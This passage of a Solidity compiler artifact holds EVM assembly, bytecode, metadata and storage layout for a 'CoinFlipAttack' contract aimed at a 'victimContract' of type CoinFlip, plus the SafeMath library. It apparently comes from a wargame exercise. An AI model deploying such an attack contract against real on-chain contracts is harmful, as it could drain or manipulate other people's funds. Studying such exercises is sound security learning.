											"name": "PUSH [tag]",
											"source": 3,
											"value": "30"
										},
										{
											"begin": 1010,
											"end": 1047,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1010,
											"end": 1047,
											"name": "tag",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 1010,
											"end": 1047,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 997,
											"end": 1047,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 997,
											"end": 1047,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 912,
											"end": 1053,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 912,
											"end": 1053,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 912,
											"end": 1053,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 912,
											"end": 1053,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1059,
											"end": 1220,
											"name": "tag",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 1059,
											"end": 1220,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1161,
											"end": 1213,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "58"
										},
										{
											"begin": 1207,
											"end": 1212,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1161,
											"end": 1213,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "31"
										},
										{
											"begin": 1161,
											"end": 1213,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1161,
											"end": 1213,
											"name": "tag",
											"source": 3,
											"value": "58"
										},
										{
											"begin": 1161,
											"end": 1213,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1156,
											"end": 1159,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1149,
											"end": 1214,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1059,
											"end": 1220,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1059,
											"end": 1220,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1059,
											"end": 1220,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1226,
											"end": 1478,
											"name": "tag",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 1226,
											"end": 1478,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1334,
											"end": 1338,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1372,
											"end": 1374,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 1361,
											"end": 1370,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1357,
											"end": 1375,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1349,
											"end": 1375,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1349,
											"end": 1375,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1385,
											"end": 1471,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 1468,
											"end": 1469,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1457,
											"end": 1466,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 1453,
											"end": 1470,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1444,
											"end": 1450,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 1385,
											"end": 1471,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 1385,
											"end": 1471,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1385,
											"end": 1471,
											"name": "tag",
											"source": 3,
											"value": "60"
										},
										{
											"begin": 1385,
											"end": 1471,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1226,
											"end": 1478,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1226,
											"end": 1478,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1226,
											"end": 1478,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1226,
											"end": 1478,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1226,
											"end": 1478,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1484,
											"end": 1561,
											"name": "tag",
											"source": 3,
											"value": "33"
										},
										{
											"begin": 1484,
											"end": 1561,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1521,
											"end": 1528,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1550,
											"end": 1555,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1539,
											"end": 1555,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1539,
											"end": 1555,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1484,
											"end": 1561,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1484,
											"end": 1561,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1484,
											"end": 1561,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1484,
											"end": 1561,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1567,
											"end": 1747,
											"name": "tag",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 1567,
											"end": 1747,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1615,
											"end": 1692,
											"name": "PUSH",
											"source": 3,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1612,
											"end": 1613,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1605,
											"end": 1693,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1712,
											"end": 1716,
											"name": "PUSH",
											"source": 3,
											"value": "11"
										},
										{
											"begin": 1709,
											"end": 1710,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 1702,
											"end": 1717,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1736,
											"end": 1740,
											"name": "PUSH",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 1733,
											"end": 1734,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1726,
											"end": 1741,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 1753,
											"end": 1944,
											"name": "tag",
											"source": 3,
											"value": "15"
										},
										{
											"begin": 1753,
											"end": 1944,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1793,
											"end": 1797,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1813,
											"end": 1833,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "64"
										},
										{
											"begin": 1831,
											"end": 1832,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1813,
											"end": 1833,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "33"
										},
										{
											"begin": 1813,
											"end": 1833,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1813,
											"end": 1833,
											"name": "tag",
											"source": 3,
											"value": "64"
										},
										{
											"begin": 1813,
											"end": 1833,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1808,
											"end": 1833,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1808,
											"end": 1833,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1847,
											"end": 1867,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "65"
										},
										{
											"begin": 1865,
											"end": 1866,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 1847,
											"end": 1867,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "33"
										},
										{
											"begin": 1847,
											"end": 1867,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1847,
											"end": 1867,
											"name": "tag",
											"source": 3,
											"value": "65"
										},
										{
											"begin": 1847,
											"end": 1867,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1842,
											"end": 1867,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1842,
											"end": 1867,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1886,
											"end": 1887,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1883,
											"end": 1884,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1880,
											"end": 1888,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 1877,
											"end": 1911,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 1877,
											"end": 1911,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 1877,
											"end": 1911,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 1891,
											"end": 1909,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "67"
										},
										{
											"begin": 1891,
											"end": 1909,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 1891,
											"end": 1909,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1891,
											"end": 1909,
											"name": "tag",
											"source": 3,
											"value": "67"
										},
										{
											"begin": 1891,
											"end": 1909,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1877,
											"end": 1911,
											"name": "tag",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 1877,
											"end": 1911,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1936,
											"end": 1937,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1933,
											"end": 1934,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1929,
											"end": 1938,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 1921,
											"end": 1938,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1921,
											"end": 1938,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1753,
											"end": 1944,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1753,
											"end": 1944,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1753,
											"end": 1944,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1753,
											"end": 1944,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1753,
											"end": 1944,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1950,
											"end": 2130,
											"name": "tag",
											"source": 3,
											"value": "35"
										},
										{
											"begin": 1950,
											"end": 2130,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1998,
											"end": 2075,
											"name": "PUSH",
											"source": 3,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1995,
											"end": 1996,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1988,
											"end": 2076,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2095,
											"end": 2099,
											"name": "PUSH",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 2092,
											"end": 2093,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 2085,
											"end": 2100,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2119,
											"end": 2123,
											"name": "PUSH",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 2116,
											"end": 2117,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2109,
											"end": 2124,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 2136,
											"end": 2321,
											"name": "tag",
											"source": 3,
											"value": "17"
										},
										{
											"begin": 2136,
											"end": 2321,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2176,
											"end": 2177,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2193,
											"end": 2213,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 2211,
											"end": 2212,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2193,
											"end": 2213,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "33"
										},
										{
											"begin": 2193,
											"end": 2213,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2193,
											"end": 2213,
											"name": "tag",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 2193,
											"end": 2213,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2188,
											"end": 2213,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2188,
											"end": 2213,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2227,
											"end": 2247,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "71"
										},
										{
											"begin": 2245,
											"end": 2246,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 2227,
											"end": 2247,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "33"
										},
										{
											"begin": 2227,
											"end": 2247,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2227,
											"end": 2247,
											"name": "tag",
											"source": 3,
											"value": "71"
										},
										{
											"begin": 2227,
											"end": 2247,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2222,
											"end": 2247,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2222,
											"end": 2247,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2266,
											"end": 2267,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2256,
											"end": 2291,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "72"
										},
										{
											"begin": 2256,
											"end": 2291,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2271,
											"end": 2289,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "73"
										},
										{
											"begin": 2271,
											"end": 2289,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "35"
										},
										{
											"begin": 2271,
											"end": 2289,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2271,
											"end": 2289,
											"name": "tag",
											"source": 3,
											"value": "73"
										},
										{
											"begin": 2271,
											"end": 2289,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2256,
											"end": 2291,
											"name": "tag",
											"source": 3,
											"value": "72"
										},
										{
											"begin": 2256,
											"end": 2291,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2313,
											"end": 2314,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2310,
											"end": 2311,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2306,
											"end": 2315,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 2301,
											"end": 2315,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2301,
											"end": 2315,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2136,
											"end": 2321,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2136,
											"end": 2321,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2136,
											"end": 2321,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2136,
											"end": 2321,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2136,
											"end": 2321,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2408,
											"end": 2525,
											"name": "tag",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 2408,
											"end": 2525,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2517,
											"end": 2518,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2514,
											"end": 2515,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 2507,
											"end": 2519,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 2654,
											"end": 2770,
											"name": "tag",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 2654,
											"end": 2770,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2724,
											"end": 2745,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "78"
										},
										{
											"begin": 2739,
											"end": 2744,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2724,
											"end": 2745,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "25"
										},
										{
											"begin": 2724,
											"end": 2745,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2724,
											"end": 2745,
											"name": "tag",
											"source": 3,
											"value": "78"
										},
										{
											"begin": 2724,
											"end": 2745,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2717,
											"end": 2722,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2714,
											"end": 2746,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 2704,
											"end": 2764,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2704,
											"end": 2764,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2760,
											"end": 2761,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2757,
											"end": 2758,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 2750,
											"end": 2762,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 2704,
											"end": 2764,
											"name": "tag",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2704,
											"end": 2764,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2654,
											"end": 2770,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2654,
											"end": 2770,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2776,
											"end": 2913,
											"name": "tag",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2776,
											"end": 2913,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2830,
											"end": 2835,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2861,
											"end": 2867,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2855,
											"end": 2868,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 2846,
											"end": 2868,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2846,
											"end": 2868,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2877,
											"end": 2907,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2901,
											"end": 2906,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 2877,
											"end": 2907,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 2877,
											"end": 2907,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2877,
											"end": 2907,
											"name": "tag",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2877,
											"end": 2907,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2776,
											"end": 2913,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2776,
											"end": 2913,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2776,
											"end": 2913,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2776,
											"end": 2913,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2776,
											"end": 2913,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2919,
											"end": 3264,
											"name": "tag",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 2919,
											"end": 3264,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2986,
											"end": 2992,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 3035,
											"end": 3037,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 3023,
											"end": 3032,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3014,
											"end": 3021,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 3010,
											"end": 3033,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 3006,
											"end": 3038,
											"name": "SLT",
											"source": 3
										},
										{
											"begin": 3003,
											"end": 3122,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 3003,
											"end": 3122,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "83"
										},
										{
											"begin": 3003,
											"end": 3122,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 3041,
											"end": 3120,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "84"
										},
										{
											"begin": 3041,
											"end": 3120,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 3041,
											"end": 3120,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 3041,
											"end": 3120,
											"name": "tag",
											"source": 3,
											"value": "84"
										},
										{
											"begin": 3041,
											"end": 3120,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3003,
											"end": 3122,
											"name": "tag",
											"source": 3,
											"value": "83"
										},
										{
											"begin": 3003,
											"end": 3122,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3161,
											"end": 3162,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 3186,
											"end": 3247,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "85"
										},
										{
											"begin": 3239,
											"end": 3246,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 3230,
											"end": 3236,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 3219,
											"end": 3228,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 3215,
											"end": 3237,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 3186,
											"end": 3247,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 3186,
											"end": 3247,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 3186,
											"end": 3247,
											"name": "tag",
											"source": 3,
											"value": "85"
										},
										{
											"begin": 3186,
											"end": 3247,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 3176,
											"end": 3247,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 3176,
											"end": 3247,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 3132,
											"end": 3257,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2919,
											"end": 3264,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2919,
											"end": 3264,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2919,
											"end": 3264,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2919,
											"end": 3264,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2919,
											"end": 3264,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										}
									]
								}
							},
							"sourceList": [
								"contracts/Coinflip.sol",
								"contracts/CoinflipAttack.sol",
								"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"flip()": "cde4efa9",
							"victimContract()": "f32d251d"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_victimContractAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"victimContract\",\"outputs\":[{\"internalType\":\"contract CoinFlip\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CoinflipAttack.sol\":\"CoinFlipAttack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Coinflip.sol\":{\"keccak256\":\"0xf5f71814d02beb1badd816aec7513ea7546e3a200c389bc753a0515339bd5a60\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8cb365e2f1b38342ff63def1c42c3a11ffb600ad4c2e5958ea05f0c885513455\",\"dweb:/ipfs/QmfWwnsUcUrejTLLYbhmDcMQVGMkN7H9X5JYq8af9p5sCf\"]},\"contracts/CoinflipAttack.sol\":{\"keccak256\":\"0x991154fe5c030a59f88d36d9ac747449e8290c96737dc645b80a0f895b05fef5\",\"urls\":[\"bzz-raw://c0c29f9712ec53a08f30efb5666de8acb19aa586e34863b6721bf2f52d7b4939\",\"dweb:/ipfs/QmP7inoKSY3xEkaV8amxTQ3iTrboJy5JVZjGpDwNXQsaBv\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":{\"keccak256\":\"0x0f633a0223d9a1dcccfcf38a64c9de0874dfcbfac0c6941ccf074d63a2ce0e1e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://864a40efcffdf408044c332a5aa38ec5618ed7b4eecb8f65faf45671bd6cdc65\",\"dweb:/ipfs/QmQJquTMtc6fgm5JQzGdsGpA2fqBe3MHWEdt2qzaLySMdN\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 94,
								"contract": "contracts/CoinflipAttack.sol:CoinFlipAttack",
								"label": "victimContract",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(CoinFlip)87"
							},
							{
								"astId": 97,
								"contract": "contracts/CoinflipAttack.sol:CoinFlipAttack",
								"label": "FACTOR",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_contract(CoinFlip)87": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations. NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler now has built in overflow checking.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":482:6782  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  mstore(0x00, 0x4e487b7100000000000000000000000000000000000000000000000000000000)\n  mstore(0x04, 0x00)\n  revert(0x00, 0x24)\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":482:6782  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa26469706673582212200ba17f4a8c95a74ad4aef4b264ddaf3c5e5eda2da397ebfd974afa00becacd6464736f6c634300080f0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212200ba17f4a8c95a74ad4aef4b264ddaf3c5e5eda2da397ebfd974afa00becacd6464736f6c634300080f0033",
							"opcodes": "PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SIGNEXTEND LOG1 PUSH32 0x4A8C95A74AD4AEF4B264DDAF3C5E5EDA2DA397EBFD974AFA00BECACD6464736F PUSH13 0x634300080F0033000000000000 ",
							"sourceMap": "482:6300:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212200ba17f4a8c95a74ad4aef4b264ddaf3c5e5eda2da397ebfd974afa00becacd6464736f6c634300080f0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SIGNEXTEND LOG1 PUSH32 0x4A8C95A74AD4AEF4B264DDAF3C5E5EDA2DA397EBFD974AFA00BECACD6464736F PUSH13 0x634300080F0033000000000000 ",
							"sourceMap": "482:6300:2:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
